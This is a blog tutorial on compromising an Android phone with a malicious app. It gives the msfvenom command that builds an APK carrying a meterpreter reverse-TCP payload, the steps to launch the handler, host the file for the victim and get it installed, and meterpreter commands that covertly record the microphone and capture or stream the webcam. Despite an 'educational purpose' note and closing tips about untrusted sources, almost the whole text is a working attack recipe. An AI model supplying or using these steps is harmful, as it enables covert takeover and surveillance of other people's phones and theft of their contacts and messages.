
<p><span style="float: left; width: 0.8em; font-size: 600%; font-family: courier new, courier; line-height: 80%;">W</span>hat can happen to your android phone when you download an android application from an untrusted source? What would be its impact on your phone? Well, the results are pretty scary. You won't even know what is going on in the background of your android phone when you download a malicious application.</p>

<p>In this article, we will learn how an attacker can take over control on your phone when you install an application from untrusted sources. We will learn about the approach he/she can take and the results. So, let's begin.</p>

<p><em><strong>Note:</strong> Before we proceed, please keep in mind that this tutorial/article is just for an educational purpose. This is to make everyone aware about the consequences of using android application from an untrusted/unknown sources.</em></p>

<p>I will be performing the process in my own network only. But, one can perform the attack process in any network either LAN or WAN (External network). In this process, three actors are involved:</p>

<ul id="block-400dce76-fd3e-48ca-9918-fe47222769a8"><li>Kali Linux Machine<strong> (Attacker)</strong></li><li>Malicious Android application<strong> (APK)</strong></li><li>Android Phone<strong> (Victim)</strong></li></ul>

<p><em><strong>Note:</strong> Attacker and Victim are on the same network here i.e. 192.168.172.x.</em></p>

<p><strong>Step-1: Creating Malicious Payload</strong></p>

<p>You need to create a malicious android payload first. For this, login to your Kali Linux machine and follow the below command (Hope you already have installed the Kali Linux in your PC. If not, you can find tons of tutorial for installing Kali Linux over internet. I will not be wasting your time here :-D)</p>

<p><strong>#<code>msfvenom -p android/meterpreter/reverse_tcp LHOST=&lt;ip-address&gt; LPORT=&lt;any unused port&gt; -f raw &gt; myandroid.apk</code></strong></p>

![image-1](https://user-images.githubusercontent.com/92144178/136511602-460ffb67-f397-43f4-9dc5-80336e06afc8.png)

<p>"<em>Msfvenom, here is a command line instance of Metasploit that is used to generate and output all of the various types of shell code that are available in Metasploit.</em>"</p>

<strong>•	-p:</strong> Payload <br><strong>•	LHOST:</strong> Local Host <br><strong>•	LPORT:</strong> Local Port <br><strong>•	-f:</strong> Format
 

<p><strong>Step-2: Launch Metasploit Framework</strong></p>

<p>Once you create your own APK, it's time launch metasploit framework using msfconsole command in Kali linux machine.</p>

<p>"<em>The Metasploit Framework is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute exploit code. The Metasploit Framework contains a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection.</em>"</p>

<p>Once the Metasploit framework is launched, you need to use multi/handler, which is a stub that handles exploits launched outside of the framework.</p>

![image-2](https://user-images.githubusercontent.com/92144178/136511950-a4fd8947-33f7-4ae3-b1e3-0650d921a334.png)

<p><em><strong>Note:</strong> Make sure you're using the same payload which you have used while creating the malicious apk in Step-1.</em></p>

<p><strong>Step-3: Host the Malicious Android Application</strong></p>

<p>Now, handler is running. You need to host your malicious android application to somewhere so that victim can download it in his/her android phone.</p>

<p>As this process is only for our own network, you can host it there only. For this you can use one python's module called SimpleHTTPServer.</p>

<p>"<em>Python’s SimpleHTTPServer is the classic quick solution for serving the files in a directory via HTTP (often, you’ll access them locally, via localhost).</em>"</p>

<p><strong>#<code>python -m SimpleHTTPServer 8080</code></strong></p>

![image-3](https://user-images.githubusercontent.com/92144178/136512500-039235d0-94dc-42bc-9719-1e1cdd726000.png)

<p><em><strong>Note:</strong> The above command should be run under the same directory where the malicious android application is kept.</em></p>

<p><strong>Step-4: Download the Hosted Malicious APK on Android Phone</strong></p>

<p>Now, download the malicious android application using the following URL in your android phone's browser. <em>(Please remember the IP address in the URL is your Kali Linux machine local IP address)</em></p>

<p><strong><code>http://192.168.172.32:8080/myandroid.apk</code></strong></p>

![Screenshot_20211007-131743_Chrome](https://user-images.githubusercontent.com/92144178/136513557-054fb4a3-ad08-4ebb-81fa-9d08e687fc6c.jpg)
<br>
<p>Once the hosted APK is accessed from your android phone, you can see the logs generated in Kali Linux for SimpleHTTPServer.</p>

![simple-http-server-log](https://user-images.githubusercontent.com/92144178/136512906-a0d5fcd8-d392-42f9-a399-3dd439cae55e.png)


<p><strong>Step-5: Install and Access the Android Application</strong></p>

<p>Once the apk is downloaded, install it and click on it.</p>

![combined-package-installer-and-file-resized-2](https://user-images.githubusercontent.com/92144178/136516291-b3873611-e311-4f58-9bff-560e8cdcf2f3.jpg)


<p><strong>Step-6: Et Voilà !..You Got the Control</strong></p>

<p>Once you click on the application, you can look into your Kali Linux machine. You must have got the meterpreter session. That means, you have the control on victim's android phone.</p>

![image-4](https://user-images.githubusercontent.com/92144178/136516512-5136ce39-c12f-40f5-a57a-ccb6b62fbf27.png)

<p><strong>Step-7: Get Ready for the Killing</strong></p>

<p>Now, you can type "help" command to see what you can do with the victim's phone.</p>

![help-all-combined](https://user-images.githubusercontent.com/92144178/136519833-ceb86a4e-0e2b-4133-bafe-76c85cb73274.png)

<p><strong>Step-8: Sneak Peek</strong></p>

<p>As you can see, you can run numerous commands on the hacked android phone. You can dump all the contact numbers, SMS and other sensitive data. You can record the audio, switch ON the camera and even run a live webcam on victim's phone. Victim will be totally unaware about it. Here're the command below you can run to check:</p>

<p><strong>meterpreter&gt;record_mic</strong>  --&gt; To record the audio</p>
<p><strong>meterpreter&gt;webcam_snap</strong>  --&gt; To capture the image from the camera</p>
<p><strong>meterpreter&gt;webcam_stream</strong>  --&gt; To run live camera/video</p>

<p>As you can see, how scary it can be if you download the android application from unknown/untrusted sources.</p>
<br>
<p><strong>Conclusion</strong></p>

<p>So, what we learned from the activity we've done is:</p>

<ul><li>Never download any android application from unknown/untrusted sources.</li><li>Always download the application from Google Play Store.</li><li>Make sure your installed application gets scanned with Google Play Protect.</li><li>Disable Installation of Unknown applications in phone Settings.</li></ul>


<p>So, this is it for now. I hope this article was insightful. In the 2nd part, we will learn more sophisticated way to create malicious android application. Stay tuned..!!</p>
<br>
<p><strong>Reference</strong></p>

<li><a href="https://www.offensive-security.com/metasploit-unleashed/">https://www.offensive-security.com/metasploit-unleashed/</a></li>

<br>
<p><strong>Upcoming Blog - How to Hack an Android Phone using an Malicious Android Application (Part-2)</strong></p>
<br>
<script src="https://utteranc.es/client.js"
        repo="vinagrsec/android-hacking"
        issue-term="pathname"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>


